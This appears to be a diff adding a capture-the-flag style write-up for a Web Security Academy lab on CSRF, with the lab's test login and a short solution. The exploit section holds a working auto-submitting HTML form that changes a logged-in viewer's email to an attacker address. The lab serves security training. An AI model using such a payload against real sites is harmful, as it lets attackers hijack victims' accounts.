@@ -1,0 +1,32 @@
+// Lab: CSRF where token validation depends on token being present
+
+This lab's email change functionality is vulnerable to CSRF.
+
+To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+
+// Solution
+
+1. Let's login as given credentials.
+
+2. Then craft the HTML exploit.
+
+
+// Exploit
+
+<form
+  method="post"
+  action="https://0afc00e403da78b980673acd005e0042.web-security-academy.net/my-account/change-email"
+>
+  <input type="hidden" name="email" value="attacker@evil.com" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
+3. Inject this in Exploit server and solve the lab
+
